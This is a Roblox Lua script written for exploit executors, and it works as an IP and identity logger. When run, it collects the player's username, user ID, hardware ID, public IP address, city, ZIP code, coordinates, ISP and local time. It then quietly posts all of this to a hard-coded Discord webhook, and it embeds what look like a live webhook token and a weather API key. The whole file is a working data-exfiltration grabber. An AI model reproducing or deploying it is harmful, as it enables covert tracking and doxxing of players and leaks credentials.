local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local WEBHOOK = "https://discord.com/api/webhooks/1407015077449830440/gYTTRMAVId9hSA-jnAQV6AA1W2Ew5YKKYeAH5psuuaFMTNXne10rwUdNCUQDwYvOYpsm"
local WEATHER_API_KEY = "d76006d3379c4fce908233250251107"

local lp = Players.LocalPlayer
local hwid = gethwid and gethwid() or "Unknown"
local executor = identifyexecutor and identifyexecutor() or "Unknown"

local avatar = "N/A"
pcall(function()
	local raw = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. lp.UserId .. "&size=420x420&format=Png&isCircular=true")
	local data = HttpService:JSONDecode(raw)
	avatar = data.data and data.data[1] and data.data[1].imageUrl or "N/A"
end)

local ipData = {}
pcall(function()
	local res = (http_request or request or syn and syn.request)({
		Url = "http://ip-api.com/json",
		Method = "GET"
	})
	ipData = HttpService:JSONDecode(res.Body)
	if ipData.status ~= "success" then ipData = {} end
end)

local currencyCode, currencyInfo = nil, {}
pcall(function()
	local res = (http_request or request or syn and syn.request)({
		Url = "https://raw.githubusercontent.com/leequixxx/currencies.json/refs/heads/master/currencies.json",
		Method = "GET"
	})
	local currencyList = HttpService:JSONDecode(res.Body)
	if ipData.country then
		for _, data in ipairs(currencyList) do
			if string.find(data.namePlural or "", ipData.country) or string.find(data.name or "", ipData.country) then
				currencyCode = data.code
				currencyInfo = data
				break
			end
		end
	end
end)

local exchangeRateStr = "Unavailable"
if currencyCode and currencyCode ~= "USD" then
	pcall(function()
		local res = (http_request or request or syn and syn.request)({
			Url = "https://open.er-api.com/v6/latest/USD",
			Method = "GET"
		})
		local rates = HttpService:JSONDecode(res.Body)
		if rates.result == "success" then
			local rate = rates.rates[currencyCode]
			if rate and tonumber(rate) > 0 then
				local inverse = 1 / rate
				exchangeRateStr = string.format(
					"💵 **1 USD = %.2f %s (%s)**\n🔁 **1 %s = %.4f USD**",
					rate,
					currencyInfo.symbol or "?",
					currencyInfo.name or "?",
					currencyInfo.symbol or currencyCode,
					inverse
				)
			end
		end
	end)
end

local weatherStr, localTime = "Unavailable", "Unavailable"
if ipData.lat and ipData.lon then
	local query = tostring(ipData.lat) .. "," .. tostring(ipData.lon)
	local weatherUrl = "http://api.weatherapi.com/v1/current.json?key="..WEATHER_API_KEY.."&q="..query

	pcall(function()
		local res = game:HttpGet(weatherUrl)
		local wData = HttpService:JSONDecode(res)
		local c = wData.current
		weatherStr = string.format("🌤 %s | %.1f°C / %.1f°F", c.condition.text, c.temp_c, c.temp_f)
		localTime = wData.location.localtime or "Unknown"
	end)
end

local data = {
	embeds = {{
		title = "✅ Script Executed",
		color = 0x57F287,
		description = "**🔍 Execution Details:**",
		thumbnail = { url = avatar },
		fields = {
			{ name = "👤 Username", value = lp.Name, inline = true },
			{ name = "📛 Display Name", value = lp.DisplayName, inline = true },
			{ name = "🆔 UserId", value = tostring(lp.UserId), inline = true },
			{ name = "💻 Executor", value = executor, inline = true },
			{ name = "🧬 HWID", value = hwid, inline = false },
			{ name = "🌐 IP Address", value = ipData.query or "Unknown", inline = true },
			{ name = "🌆 City", value = ipData.city or "Unknown", inline = true },
			{ name = "🗺️ Region", value = (ipData.regionName or "Unknown") .. " (" .. (ipData.region or "?") .. ")", inline = true },
			{ name = "🏳️ Country", value = (ipData.country or "Unknown") .. " (" .. (ipData.countryCode or "?") .. ")", inline = true },
			{ name = "📮 ZIP", value = ipData.zip or "Unknown", inline = true },
			{ name = "📍 Lat / Long", value = tostring(ipData.lat or "?") .. ", " .. tostring(ipData.lon or "?"), inline = false },
			{ name = "🕒 Timezone", value = ipData.timezone or "Unknown", inline = true },
			{ name = "🧭 Local Time", value = localTime, inline = true },
			{ name = "🌦️ Weather", value = weatherStr, inline = true },
			{ name = "📡 ISP", value = ipData.isp or "Unknown", inline = true },
			{ name = "📶 AS", value = ipData.as or "Unknown", inline = false },
			{ name = "💡 Fun Fact", value = exchangeRateStr, inline = false }
		},
		footer = {
			text = "🧾 Executed at: " .. os.date("%Y-%m-%d %H:%M:%S")
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}}
}

pcall(function()
	(http_request or request or syn and syn.request)({
		Url = WEBHOOK,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode(data)
	})
end)
